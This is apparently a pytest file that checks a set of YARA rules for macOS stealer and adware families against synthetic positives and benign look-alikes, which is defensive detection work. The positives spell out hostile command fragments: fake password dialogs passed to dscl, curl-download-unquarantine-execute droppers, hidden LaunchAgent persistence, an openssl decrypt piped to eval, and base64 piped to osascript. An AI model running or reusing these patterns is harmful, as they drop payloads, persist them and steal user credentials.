"""Our rules (rules/*.yar): compile with yara-x and fire on synthetic positives, not on look-alikes."""

import re
from pathlib import Path

import pytest
import yara_x

from pipeline.yara_rules import load_local_rules, rule_spans, validate

from .conftest import MACHO

RULES_DIR = Path(__file__).resolve().parents[2] / "rules"
REQUIRED_META = {"author", "description", "family", "severity", "reference", "date"}
SEVERITIES = {"info", "low", "medium", "high", "critical"}


@pytest.fixture(scope="module")
def scanner() -> yara_x.Scanner:
    c = yara_x.Compiler()
    for f in sorted(RULES_DIR.glob("*.yar")):
        c.new_namespace(f.stem)
        c.add_source(f.read_text(), origin=f.name)
    return yara_x.Scanner(c.build())


def hits(scanner: yara_x.Scanner, data: bytes) -> set[str]:
    return {r.identifier for r in scanner.scan(data).matching_rules}


def test_all_rule_files_valid_with_metadata():
    files = load_local_rules(RULES_DIR, "parabellum")
    rep = validate(files)
    assert rep.rejected_files == [] and rep.renamed_away == []
    assert len(rep.accepted) == len(files) >= 10
    for f in files:
        assert yara_x.compile(f.text).scan(b"").matching_rules == ()
        _, spans = rule_spans(f.text)
        for name, start, end in spans:
            block = f.text[start:end].split("strings:")[0]
            meta = dict(re.findall(r'^\s*(\w+)\s*=\s*"([^"]*)"', block, re.MULTILINE))
            assert set(meta) >= REQUIRED_META, (f.name, name, REQUIRED_META - set(meta))
            assert meta["severity"] in SEVERITIES
            assert meta["reference"].startswith("https://")
            assert name.startswith("Parabellum_MacOS_")


POSITIVES = {
    "Parabellum_MacOS_AMOS_Stealer_Binary": MACHO
    + b"dscl /Local/Default -authonly \x00login.keychain-db\x00Electrum\x00Exodus\x00Coinomi\x00"
    b"Login Data\x00Web Data\x00POST /joinsystem\x00",
    "Parabellum_MacOS_AMOS_Stealer_AppleScript": b'set r to display dialog "Enter password" default answer "" '
    b'with hidden answer\ndo shell script "dscl . authonly " & u & " " & p\non filegrabber()\n'
    b"login.keychain-db Electrum Exodus\n",
    "Parabellum_MacOS_Poseidon_Stealer": b'display dialog "x" with hidden answer\ndscl . authonly u p\n'
    b"login.keychain FortiClient WireGuard MetaMask Exodus\n",
    "Parabellum_MacOS_Banshee_Stealer": MACHO
    + b"system_profiler SPHardwareDataType | grep 'Model Identifier'\x00defaults read AppleLanguages\x00"
    b'display dialog "p" default answer "" with hidden answer\x00login.keychain-db\x00Electrum\x00MetaMask\x00',
    "Parabellum_MacOS_Cuckoo_Stealer": MACHO
    + b"hy_AM\x00be_BY\x00kk_KZ\x00ru_RU\x00uk_UA\x00display dialog\x00login.keychain\x00screencapture\x00"
    b"Library/LaunchAgents\x00",
    "Parabellum_MacOS_Cthulhu_Stealer": MACHO
    + b'\xff Go build ID: "x"\x00osascript\x00display dialog\x00with hidden answer\x00MetaMask\x00'
    b"login.keychain\x00Coinbase\x00",
    "Parabellum_MacOS_KandyKorn_SugarLoader": MACHO + b"/Library/Caches/com.apple.safari.ck\x00",
    "Parabellum_MacOS_KandyKorn_HLoader": MACHO
    + b"/Applications/Discord.app/Contents/MacOS/.lock\x00/Applications/Discord.app/Contents/MacOS/Discord\x00",
    "Parabellum_MacOS_KandyKorn_PythonStage": b"import urllib.request\nurllib.request.urlretrieve(u, "
    b"'/Users/Shared/testSpeed.py')\nurllib.request.urlretrieve(v, '/Users/Shared/FinderTools')\n",
    "Parabellum_MacOS_RustBucket_Stage": b'do shell script "curl -o /Users/Shared/.pd https://x -d pw=1; '
    b'chmod +x /Users/Shared/.pd" -- Internal PDF Viewer\n',
    "Parabellum_MacOS_XLoader_Like_Credential_Stealer": MACHO
    + b"Library/LaunchAgents\x00ProgramArguments\x00Google/Chrome\x00Login Data\x00Firefox/Profiles\x00"
    b"logins.json\x00key4.db\x00",
    "Parabellum_MacOS_Adload": MACHO
    + b"%@/Library/Application Support/.%@/Services/com.%@Daemon.app\x00LaunchAgents\x00launchctl\x00"
    b"IOPlatformUUID\x00",
    "Parabellum_MacOS_Pirrit_GoSearch22": MACHO + b"GoSearch22\x00SafariExtension\x00",
    "Parabellum_MacOS_Shlayer_Openssl_Eval": b'#!/bin/bash\ncd "$(dirname "$BASH_SOURCE")"\n'
    b'eval "$(openssl enc -base64 -d -aes-256-cbc -nosalt -pass pass:2097994205 <"$fileDir"/Resources/enc)"\n',
    "Parabellum_MacOS_Bundlore_Dropper_Script": b"#!/bin/bash\nT=$(mktemp -d /tmp/XXXX)\n"
    b'curl -fsL https://x/app.zip -o "$T/a.zip"\nunzip -q "$T/a.zip" -d "$T"\n'
    b'xattr -r -d com.apple.quarantine "$T/App.app"\nopen -a "$T/App.app"\n',
    "Parabellum_MacOS_Generic_Fake_Password_Dialog_Exfil": b'set p to text returned of (display dialog "Enter your '
    b'password" default answer "" with hidden answer)\ndo shell script "dscl . authonly " & u & " " & p\n'
    b'do shell script "ditto -c -k --sequesterRsrc /tmp/x /tmp/x.zip"\n',
    "Parabellum_MacOS_Generic_Quarantine_Removal_Dropper": b"#!/bin/sh\ncurl -sL https://x/p -o /tmp/p\n"
    b"xattr -d com.apple.quarantine /tmp/p\nchmod +x /tmp/p\n/tmp/p &\n",
    "Parabellum_MacOS_Generic_Hidden_LaunchAgent_Writer": b"cat > ~/Library/LaunchAgents/com.x.plist <<EOF\n"
    b"<key>ProgramArguments</key><array><string>/Users/Shared/.hidden/agent</string></array>\nEOF\n"
    b"launchctl load ~/Library/LaunchAgents/com.x.plist\n",
    "Parabellum_MacOS_Generic_Base64_Osascript": b"echo "
    + b"ZGlzcGxheSBkaWFsb2cgIkhlbGxvIiB3aXRoIGhpZGRlbiBhbnN3ZXIgZGVmYXVsdCBhbnN3ZXIgIiI="
    + b" | base64 -d | osascript\n",
}


@pytest.mark.parametrize("rule", sorted(POSITIVES))
def test_rule_fires_on_synthetic_positive(scanner, rule):
    assert rule in hits(scanner, POSITIVES[rule])


def test_every_rule_has_a_positive(scanner):
    files = load_local_rules(RULES_DIR, "parabellum")
    all_rules = {r for f in validate(files).accepted for r in f.rules}
    assert all_rules == set(POSITIVES)


@pytest.mark.parametrize(
    "benign",
    [
        # Legit admin script: password prompt for FileVault, no exfiltration.
        b'set p to text returned of (display dialog "Password" default answer "" with hidden answer)\n'
        b'do shell script "dscl . authonly " & u & " " & p\ndo shell script "fdesetup enable"\n',
        # Installer writing a LaunchDaemon into a normal location.
        b"#!/bin/sh\ncp com.vendor.plist /Library/LaunchDaemons/\n<key>ProgramArguments</key>"
        b"/usr/local/bin/agent\nlaunchctl load /Library/LaunchDaemons/com.vendor.plist\n",
        # Strips quarantine of an app the user installed, no download to tmp.
        b"#!/bin/sh\nxattr -d com.apple.quarantine /Applications/Tool.app\n",
        # Locale tables (ICU-like) in a Mach-O.
        MACHO + b"hy_AM\x00be_BY\x00kk_KZ\x00ru_RU\x00uk_UA\x00fr_FR\x00",
        # Mach-O mentioning Discord normally.
        MACHO + b"/Applications/Discord.app/Contents/MacOS/Discord\x00",
    ],
)
def test_rules_quiet_on_lookalikes(scanner, benign):
    assert hits(scanner, benign) == set()
